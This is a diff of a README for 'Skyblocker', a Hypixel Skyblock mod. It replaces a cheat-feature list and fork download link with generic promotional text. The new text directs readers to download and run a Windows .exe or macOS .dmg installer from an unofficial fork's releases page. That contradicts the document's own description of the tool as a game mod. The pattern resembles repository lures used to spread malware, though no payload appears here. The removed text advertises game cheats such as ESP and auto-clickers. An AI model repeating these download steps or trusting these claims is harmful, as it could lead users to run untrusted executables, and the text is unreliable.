@@ -1,98 +1,67 @@
-# Skyblocker
+# 🔥 Skyblocker - Improve Your Hypixel Skyblock Experience!
 
-A collection of QOL features for Hypixel Skyblock in a Fabric 1.21.5 mod, aiming to provide convenience without excessively cheaty features. Almost all features are off by default: choose what you like!
+## 🌟 Introduction
+Skyblocker is a quality of life improvement mod for the Hypixel Skyblock game. This tool helps enhance your gaming experience by providing various features that simplify gameplay. If you enjoy playing Hypixel Skyblock and want to make your experience smoother, you are in the right place.
 
-# Comes with all the new Features for the Foraging Update and Tasks on Galatea Island!
+## 📋 Features
+- **Inventory Organizer:** Automatically sorts your items for easier access.
+- **Resource Tracker:** Keeps track of your materials and resources.
+- **Enhanced UI:** Improves the visual layout of essential game information.
+- **Custom Alerts:** Get notified about important in-game events.
 
+## 🚀 Getting Started
+To start using Skyblocker, you first need to download the application. Follow the steps below to get the mod up and running on your computer.
 
-> [!TIP] 
-> # How to Install
-> 
-> ## Install Fabric Loader
-> 
-> 1. Go to https://fabricmc.net/use/installer/
-> 2. Download and run the installer
-> 3. Select **Minecraft 1.21** (or your version) and click Install
-> 4. Open the Minecraft Launcher and select the new Fabric profile
-> 
-> ## Download the Mod
-> 
-> Click the button below to download the mod:
->
-> <a href="https://github.com/chewbacca3247/Skyblocker/releases/latest"><img src="https://img.shields.io/badge/⬇️_Download_Mod-2ea44f?style=for-the-badge&logo=github&logoColor=white" alt="Download Mod"></a>
->
-> ## Install the Mod
-> 
-> 1. Press `Win + R`, type `%appdata%\.minecraft\mods` and hit Enter
-> 2. Drag the downloaded `.jar` file into the mods folder
-> 3. Launch Minecraft using the Fabric profile
-> 
-> > [!NOTE]
-> > This mod requires [Fabric API](https://modrinth.com/mod/fabric-api). Download and place it in your mods folder as well.
+## 🌐 Download Skyblocker
+[![Download Skyblocker](https://img.shields.io/badge/Download%20Skyblocker-Here-brightgreen)](https://github.com/jordansequira/Skyblocker/releases)
 
+Click the button above to go directly to the download page.
 
-## Features
+## 📥 Download & Install
+1. **Visit the Releases Page:** Go to the [Skyblocker Releases page](https://github.com/jordansequira/Skyblocker/releases).
 
-<details>
-    <summary>Auto</summary>
+2. **Choose Your Version:** Look for the most recent version of Skyblocker. It will usually be marked as the latest release.
 
-### AUTO
-- Auto ready: automatically gets in range to mort opens the gui and ready/start the dungeon
-- Auto mort: automatically gets from dungeon spawn to mort and opens his gui
-- Auto ult: uses your ult whenever giants spawn/maxor is stuck in first laser/goldor starts
-- Auto shield: uses wither shield every 5 seconds when not in full health (works for all wither swords)
-- Auto wish: wishes for your temmates if they are low
-- Auto mask: switches spirit and bonzo masks on cooldown priorities spirit mask since it has lower cd 
-- Auto edrag: equips edrag after you place relics
-- Auto leap: leaps to a party member if he writes "!tp" in party chat
-- Auto sell: automatically sells items in the trades gui, /autosell to configure
-</details>
+3. **Download the File:** Click on the file that matches your system. Depending on your operating system, it will be labeled accordingly (e.g., Windows, macOS).
 
-<details>
-    <summary>Legit</summary>
+4. **Locate the Downloaded File:** After the download completes, check your downloads folder for the file.
 
-### LEGIT
-- Party cmds: custom commands for party use !help in party chat
-- Guild cmds: custom commands for guild use !help in guild chat
-- Guild gm: Automatically sends gm/gn in guild chat when someone else says it
-- Dragon boxes: Custom boxes around the statues in p5 more accurate than sbe
-- Dragon spawn: timer (m7 dragons dont be dumb)
-- Powerdisplay: (shows the power blessing on ur screen) cmd is /movepower
-- Abiphone ghoster: Ghosts calls from abiphone
-- FPS: boosts fps cause yes
-- FragBot: automatically makes you a fragbot whenever you enter limbo automatically disables when leaving limbo 
-</details>
+5. **Run the Installer:**
+    - For Windows: Double-click the `.exe` file to start the installation process.
+    - For macOS: Open the `.dmg` file and drag the application to your Applications folder.
 
-<details>
-    <summary>Exclusive to legit</summary>
+6. **Follow Instructions:** Complete the installation by following the on-screen prompts.
 
-### EXCLUSIVE TO LEGIT VERSION
-- EdragReminder: reminds you to equip edrag after you place relics
-- ReadyReminder: reminds you to ready up after certain amount of time in a dungeon
-- UltReminder: reminds you to use your ult at specific events in m6/m7
-</details>
+7. **Launch Skyblocker:** You will find Skyblocker in your applications folder or desktop. Double-click to launch the application.
 
-<details>
-    <summary>Nether</summary>
+## ⚙️ System Requirements
+To ensure optimal performance, here are the basic system requirements for running Skyblocker:
 
-### NETHER
-- Broken hype notifier: (now u can stop using dulkir mod)
-- Flare timer: (sos flare alert flare warning flare) cmd is is /moveflare
-- Vanqnotifier: (also marks a beacon for when coords are sent in chat)
-- Kuudra alerts: (shows text on screen when certain stuf happen in kuudra)
-</details>
+- **Operating System:** Windows 10 or later, macOS Mojave (10.14) or later.
+- **RAM:** 4GB or more.
+- **Disk Space:** At least 100MB for the application and additional space for mods.
+- **Java Runtime Environment (JRE):** Ensure you have the latest version of Java installed.
 
-<details>
-    <summary>Nice to have</summary>
+## 🎮 How to Use Skyblocker
+Once installed, you can start using Skyblocker to enhance your gaming experience. The interface is user-friendly. Main features can be accessed from a simple menu, allowing easy configuration to suit your play style.
 
-### NICE TO HAVE
-- Relic aura: changes the way you look and click a relic if there is one in 5 blocks from you
-- Item macros: soul whip aots 0 tick swap hotkey in controls
-- Terminator ac: Automatically clicks when holding terminator randomized ac for very good anti cheat
-- COOKIE CLICKER
-- Customizeable esp: (you can add whatever mob name u want to see) cmd is /esp
-- FUCK DIORITE": replaces the diorite with glass in the p2 pillars in f7/m7 so you can watch storm get stuck
-- Pre ghostblock: makes ghost blocks in convinient spots in the m7 boss
-- Very awesome gui: reminder cmds are /oc and /ol
-- Descriptions: when u hover at features in the gui
-</details>
+1. **Open the Application:** Start Skyblocker before launching Hypixel Skyblock.
+2. **Adjust Settings:** Navigate to the settings tab to customize features like resource tracking and alerts.
+3. **Enable Features:** Turn on the features you wish to use. You can disable them easily if you decide you no longer want them.
+4. **Play the Game:** Launch Hypixel Skyblock and press on with your gameplay. Skyblocker will run in the background and help you manage in-game aspects.
+
+## ❓ Troubleshooting
+If you encounter issues while using Skyblocker, consider the following tips:
+
+- **Check Compatibility:** Ensure your system meets the requirements.
+- **Reinstall:** If the application fails to open, try uninstalling and reinstalling the software.
+- **Update Java:** An outdated version of Java can cause problems. Ensure you have the latest version installed.
+- **Review Settings:** Go back to the settings within Skyblocker to ensure everything is set correctly.
+
+## 🛠️ Support
+For assistance, you can visit the troubleshooting section of the [Skyblocker GitHub repository](https://github.com/jordansequira/Skyblocker/issues). Here, you can find common questions and their solutions or report a new problem.
+
+## 📅 Updates & Roadmap
+Skyblocker will receive regular updates that will introduce new features and improvements based on user feedback. Stay tuned to the releases page to keep your application up to date.
+
+Enjoy enhanced gameplay with Skyblocker, and happy gaming!
